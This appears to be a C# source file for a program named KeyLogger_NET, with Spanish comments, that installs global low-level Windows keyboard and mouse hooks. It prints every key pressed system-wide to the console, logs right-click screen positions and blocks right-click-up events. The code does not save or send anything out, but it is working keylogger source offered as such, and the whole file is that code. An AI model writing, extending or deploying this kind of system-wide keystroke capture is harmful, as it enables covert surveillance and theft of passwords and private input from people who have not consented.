using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace KeyLogger_NET {
    static class Program {
        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;

        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        
        private enum MouseMessages {
            WM_LBUTTONDOWN = 0x0201,
            WM_LBUTTONUP = 0x0202,
            WM_MOUSEMOVE = 0x0200,
            WM_MOUSEWHEEL = 0x020A,
            WM_RBUTTONDOWN = 0x0204,
            WM_RBUTTONUP = 0x0205
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct POINT {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSLLHOOKSTRUCT {
            public POINT pt;
            public uint mouseData;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        private static LowLevelKeyboardProc _procKeyboard = HookKeyboardCallback;
        private static IntPtr _hookKeyboardID = IntPtr.Zero;

        private static LowLevelMouseProc _procMouse = HookMouseCallback;
        private static IntPtr _hookMouseID = IntPtr.Zero;

        [STAThread]
        static void Main(string[] args) {
            _hookKeyboardID = SetHookKeyboard(_procKeyboard);
            _hookMouseID = SetHookMouse(_procMouse);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run();
            UnhookWindowsHookEx(_hookKeyboardID);
        }
        #region hook keyboard
        private static IntPtr SetHookKeyboard(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, _procKeyboard,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookKeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
                int vkCode = Marshal.ReadInt32(lParam);
                //escribo todo lo que pone muy poco formateado
                if (Keys.Enter == (Keys)vkCode) {
                    Console.WriteLine("");
                }else{
                    Console.Write((Keys)vkCode);
                }
                //verifico si pulsa CTRL + C
                //if (Keys.Control == Control.ModifierKeys && Keys.C == (Keys)vkCode)
                //    Console.WriteLine("Estas copiando eeehhhh...");
                //if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                //verifico que se presione CTRL + F1:
                //if (Keys.F1 == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                //    Console.WriteLine((Keys)vkCode);
            }
            return CallNextHookEx(_hookKeyboardID, nCode, wParam, lParam); // devuelve la accion del usuario
            //return new IntPtr(-1); // no realiza ninguna accion del teclado
        }

        #endregion

        #region hook mouse
        private static IntPtr SetHookMouse(LowLevelMouseProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_MOUSE_LL, _procMouse,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookMouseCallback(int nCode, IntPtr wParam, IntPtr lParam){
            if (nCode >= 0) {
                MSLLHOOKSTRUCT hookStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));
                //if( MouseMessages.WM_LBUTTONDOWN == (MouseMessages)wParam) {
                //    Console.WriteLine("Click (izq) en posicion: " + hookStruct.pt.x + ", " + hookStruct.pt.y);
                //}
                //if( MouseMessages.WM_MOUSEMOVE==(MouseMessages)wParam) {
                //    Console.WriteLine("Moviendo a:" + hookStruct.pt.x + ", " + hookStruct.pt.y);
                //}
                if( MouseMessages.WM_RBUTTONUP == (MouseMessages)wParam) {
                    Console.WriteLine("Click up (der) en posicion: " + hookStruct.pt.x + ", " + hookStruct.pt.y);
                    return new IntPtr(-1);
                }else{
                    return CallNextHookEx(_hookMouseID, nCode, wParam, lParam); // devuelve la accion del usuario
                }
            }else{
                return CallNextHookEx(_hookMouseID, nCode, wParam, lParam); // devuelve la accion del usuario
            }
        }
        #endregion

        #region DLL import
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, 
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, 
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        #endregion
    }
}
